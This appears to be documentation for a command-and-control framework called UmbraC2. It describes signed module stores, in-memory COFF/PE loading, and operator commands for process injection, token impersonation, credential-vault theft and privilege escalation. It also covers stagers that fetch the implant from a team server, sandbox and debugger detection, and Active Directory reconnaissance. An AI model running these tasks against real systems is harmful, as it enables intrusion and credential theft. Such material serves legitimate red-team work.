# Extensions, modules and stagers

UmbraC2 separates three things that are often mixed together:

* an **extension** is a blob on the server (a COFF object or a PE image) that
  the server hands to an agent,
* a **task** is one unit of work for an agent,
* an **alias** is a saved task template that the team shares.

---

## 1. The extension store

The store is a directory of modules plus a signed catalogue.  The signature
is the point: an operator who can write into the directory must not be able
to push a module to the agents, and a module that was tampered with must be
refused.

```
"armory_dir": "/var/lib/umbra/armory",
"armory_key": "/var/lib/umbra/armory/pubkey.pem"
```

The catalogue lists every module the server is willing to install:

```json
{
  "version": 1,
  "entries": [
    {
      "name": "whoami",
      "version": "1.2.0",
      "os": "windows",
      "arch": "amd64",
      "format": "coff",
      "sha256": "…",
      "size": 4096,
      "description": "print the token of the current user",
      "args": ["domain"]
    }
  ]
}
```

The server verifies the Ed25519 signature over the canonical encoding of the
catalogue before it installs anything.  Without `armory_key` the server logs
a warning and refuses to install anything: an unsigned catalogue is not a
catalogue.

```bash
umbra armory list
umbra armory install whoami
umbra armory run whoami laptop-1 --args '{"domain":"LAB"}'
umbra armory remove whoami
```

`armory.run` ships the module **inside the task arguments**, so the frame
limit applies: a module has to fit into one frame together with its
arguments.  `MaxBlobSize` in `server/internal/armory/armory.go` is set to
match the frame budget, and the server refuses anything bigger instead of
truncating it.

`armory.remove` needs the admin role, `armory.run` and `armory.install` need
the operator role, and `armory.list` is open to every operator.  The rules
live in `server/internal/rbac/rbac.go` and are documented in
[PROTOCOL.md](PROTOCOL.md#operator-rpcs).

---

## 2. The command namespace

An alias is a named task template.  It saves the arguments that are always
the same and the ones that change at call time:

```json
{
  "name": "lsecrets",
  "kind": "ext",
  "extension": "lsecrets",
  "args": {"path": "C:\\ProgramData\\"},
  "args_spec": ["path"],
  "description": "list the secrets of the machine",
  "by": "alice",
  "created": 1760000000
}
```

```bash
umbra alias list
umbra alias run lsecrets laptop-1 --args '{"path":"C:\\Windows\\Temp"}'
```

The arguments of the call win over the arguments of the template, so a saved
command can be reused with a different target.  At most 256 aliases and 32
arguments per alias exist (`server/internal/alias/alias.go`).

---

## 3. In-memory modules

Nothing an agent runs has to touch the disk.

### COFF objects

A COFF object (the format Beacon Object Files use) is parsed in memory:
the header, the sections, the symbol table and the relocations are read, the
image is mapped with `VirtualAlloc`, the relocations are applied and the
entry point is called.

Agent side: `implant/rust/src/bof.rs`.
Server side: `server/internal/coff` parses the same objects, so the server
can tell the operator what a module exports before it runs.

```bash
umbra task laptop-1 bof --args '{"name":"whoami","data":"<base64>"}'
```

### PE images

A PE image is mapped into the process, its imports are resolved against the
libraries that are already loaded, the relocations are applied and the entry
point is called with `DLL_PROCESS_ATTACH`.  Nothing is written to disk.

Agent side: `implant/rust/src/post.rs` (`reflective_load`).

### The limits

| Limit | Value | Where |
|---|---|---|
| Object size | 4 MiB | `bof::MAX_OBJECT_SIZE` |
| Symbols | 4096 | `coff::MaxSymbols` |
| Module blob | the frame budget | `armory::MaxBlobSize` |
| Arguments | 32 | `alias::MaxArgs` |

---

## 4. Post-exploitation

The helpers below are Windows specific; on every other platform they report
that the capability is not available instead of pretending to work.

| Task | What it does |
|---|---|
| `inject` | reflective loading, process migration (hollowing) or a plain `LoadLibrary` |
| `token` | duplicates the access token of a process and impersonates it |
| `creds` | the Windows credential vault and the DPAPI protected material |
| `privesc` | enables the privileges the implant needs and looks for a privileged token |

```bash
umbra task laptop-1 token  --args '{"pid":1234}'
umbra task laptop-1 creds  --args '{"mode":"vault"}'
umbra task laptop-1 privesc --args '{"mode":"token"}'
umbra task laptop-1 inject --args '{"pid":1234,"mode":"reflect","data":"<base64>"}'
```

The reflective loader resolves the imports against the libraries that are
already loaded in the process.  A module that imports from a library that is
not loaded yet fails to link, and the loader says so instead of running a
half-linked image.

---

## 5. Stagers

A stager is the smallest possible piece of code that fetches the real
implant.  It carries the server address, the transport, the agent id and the
agent PSK.

```bash
umbra stager --platform windows --transport tcp --server 10.0.0.5:4001
umbra stager --platform linux --transport http --url https://10.0.0.5/agent.bin --sha256 …
```

The PowerShell and the Bash flavour read their configuration from the
environment, so the same script works for every target:

```
UMBRA_SERVER   the team server (host:port)
UMBRA_TRANSPORT  tcp or http
UMBRA_PSK      the agent key
UMBRA_SLEEP    the beacon interval
UMBRA_JITTER   the jitter in percent
UMBRA_HTTP_PATH  the path of the HTTP transport
UMBRA_AGENT_ID   the identity the implant uses
```

The stager carries a secret, so the server does not put it into the audit
log: the audit records that a stager was generated, not what it contained.
The RPC itself needs the admin role.

---

## 6. Reconnaissance

Two kinds of questions come up before anything else in an engagement: *where
am I* and *who else is here*. The implant answers both with the `recon` task,
which returns three blocks.

### The host

The same facts the `sysinfo` task reports: the host name, the user, the
operating system, the architecture, the process id, the integrity level and
the working directory.

### The environment

The implant looks at the machine it runs on and reports what it finds:

```
environment: debugger: IsDebuggerPresent
environment: sandbox: host name looks like a sandbox (SANDBOX)
environment: sandbox: the cpu reports a hypervisor flag
```

* a debugger: `IsDebuggerPresent` and `CheckRemoteDebuggerPresent` on
  Windows, the `TracerPid` in `/proc/self/status` on Linux;
* a sandbox: the account and the host name against the list of names that
  only analysis machines use, the environment variables an analysis harness
  sets (`CUCKOO_ROOT`, `SANDBOX`, …), the hypervisor flag in
  `/proc/cpuinfo`, the DMI strings of the virtual machine vendor, and the
  modules a Windows sandbox injects into every process it watches
  (`SbieDll.dll`, `cuckoomon.dll`, `cmdvrt32.exe`, …).

None of this changes the behaviour of the beacon. The findings are context
for the operator, not a policy the implant enforces: a developer debugging
the implant looks exactly like an analyst.

### The domain

The domain block answers the Active Directory questions and returns them as
edges, in the shape BloodHound uses:

```
domain    : corp.example
controller: dc01.corp.example
edges     :
  edge MemberOf        CORP\alice@corp.example -> Domain Admins
  edge HasSession      CORP\bob -> web01.corp.example
  edge AdminTo         CORP\bob -> web01.corp.example
  edge DomainController corp.example -> dc01.corp.example
```

* **MemberOf** — the groups the current user belongs to, resolved from the
  SID in `whoami /groups`. The well known identifiers are translated
  (`S-1-5-32-544` becomes `Administrators`, `S-1-5-21-…-512` becomes
  `Domain Admins`);
* **HasSession** — the users that are logged on to the machine, from
  `net session`;
* **AdminTo** — the members of the local `Administrators` group, which is
  who can take the machine over;
* **DomainController** — the controllers of the domain, from
  `nltest /dclist`.

The Windows implementation talks to the domain through the tools every
Windows installation carries (`whoami`, `net`, `nltest`). Those tools speak
the same protocols as the API and use the credentials of the logged on user,
so the implant inherits exactly the access the operator already has — and
nothing more. On a unix host the module reports the Kerberos realm, the
resolver search domain, the groups of the process and the logged on users.

---

## 7. What the server refuses to do

* An extension without a valid signature is not installed.
* A module that does not fit into one frame is not pushed.
* `armory.remove` and `stager.generate` need the admin role.
* The pivots bind to the loopback interface unless the operator says
  otherwise.
